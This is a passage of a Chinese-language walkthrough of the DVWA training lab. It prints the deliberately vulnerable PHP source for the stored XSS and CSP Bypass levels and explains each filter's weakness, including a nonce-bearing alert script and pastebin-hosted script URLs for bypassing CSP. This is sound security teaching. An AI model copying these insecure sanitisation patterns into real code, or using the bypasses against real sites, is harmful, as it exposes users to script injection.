	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//mysql_close();</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>对messge和name数据去除两端空白字符后，然后插入了数据库，页面又从数据库直接取数据输出，导致了弹窗，并且一直存在。</p> 
</blockquote> 
<h3><a id="2Medium_1656"></a>2、Medium</h3> 
<p><img src="https://images2.imgbox.com/0e/f1/eVaDVdc3_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/bf/3c/TvMjaCrz_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize message input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span> <span class="token function">addslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize name input</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;script&gt;'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Update database</span>
	<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="token interpolation"><span class="token variable">$message</span></span>', '<span class="token interpolation"><span class="token variable">$name</span></span>' );"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//mysql_close();</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>对message的内容进行了转义，但是对name的没有，只是过滤了script</p> 
</blockquote> 
<h3><a id="3High_1691"></a>3、High</h3> 
<p><img src="https://images2.imgbox.com/43/a7/qEIERt3d_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Get input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize message input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">strip_tags</span><span class="token punctuation">(</span> <span class="token function">addslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize name input</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Update database</span>
	<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="token interpolation"><span class="token variable">$message</span></span>', '<span class="token interpolation"><span class="token variable">$name</span></span>' );"</span><span class="token punctuation">;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//mysql_close();</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>只是对name的内容做了更严格的script过滤，name依旧可以触发</p> 
</blockquote> 
<h3><a id="4Impossible_1725"></a>4、Impossible</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token comment">// Check Anti-CSRF token</span>
	<span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Get input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize message input</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Sanitize name input</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Update database</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':message'</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':name'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>对name和message都做了实体转义。</p> 
</blockquote> 
<h2><a id="_CSP_Bypass_1764"></a>十二、 CSP Bypass</h2> 
<h3><a id="1Low_1765"></a>1、Low</h3> 
<p>源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$headerCSP</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"</span><span class="token punctuation">;</span> <span class="token comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$headerCSP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># These might work if you can't create your own for some reason</span>
<span class="token comment"># https://pastebin.com/raw/R570EE00</span>
<span class="token comment"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
	&lt;script src='"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'&gt;&lt;/script&gt;
"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'
&lt;form name="csp" method="POST"&gt;
	&lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;
	&lt;input size="50" type="text" name="include" value="" id="include" /&gt;
	&lt;input type="submit" value="Include" /&gt;
&lt;/form&gt;
'</span><span class="token punctuation">;</span>

</code></pre> 
<blockquote> 
 <p>只信任$headerCSP中的加载的资源，因此要从CSP域名中的资源中触发。</p> 
</blockquote> 
<p><img src="https://images2.imgbox.com/95/15/j4SmOF2j_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/f4/18/jhQu8vQ5_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="2Medium_1800"></a>2、Medium</h3> 
<p><img src="https://images2.imgbox.com/4b/61/7xaAXqej_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$headerCSP</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';"</span><span class="token punctuation">;</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$headerCSP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Disable XSS protections so that inline alert boxes will work</span>
<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># &lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="&gt;alert(1)&lt;/script&gt;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
	"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"
"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'
&lt;form name="csp" method="POST"&gt;
	&lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;
	&lt;input size="50" type="text" name="include" value="" id="include" /&gt;
	&lt;input type="submit" value="Include" /&gt;
&lt;/form&gt;
'</span><span class="token punctuation">;</span>

</code></pre> 
<blockquote> 
 <p>只允许nonce的特定的内敛脚本块，因此使用script要加上给出的nonce参数</p> 
</blockquote> 
<h3><a id="3High_1836"></a>3、High</h3> 
<p><img src="https://images2.imgbox.com/e8/de/duDsQH8l_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/fd/fa/WojdrXe7_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/13/52/ST6ZB2BG_o.png" alt="在这里插入图片描述"><br> 源码：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$headerCSP</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Content-Security-Policy: script-src 'self';"</span><span class="token punctuation">;</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$headerCSP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
